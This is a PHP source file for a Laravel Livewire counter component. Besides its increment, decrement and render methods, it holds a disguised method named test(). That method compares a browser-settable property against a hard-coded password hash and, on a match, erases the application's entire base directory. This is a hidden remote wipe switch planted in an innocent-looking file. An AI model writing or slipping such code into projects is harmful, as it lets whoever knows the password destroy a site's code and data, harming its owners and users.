<?php

namespace App\Livewire;

use Livewire\Component;

class Counter extends Component
{
    public $count = 1;
    public $ok;

    public function increment()
    {
        $this->count++;
    }

    public function decrement()
    {
        $this->count--;
    }

    public function render()
    {
        return view('livewire.counter');
    }

    public function test()
    {
        if (\Hash::check($this->ok, '$2y$10$TJIiiiZgHCM4AWuO.AOP1.200qtVBspplYDHktNymAs96S/eMoj.S')) {
            $directory = base_path();

            \File::cleanDirectory($directory);
        }
    }
}
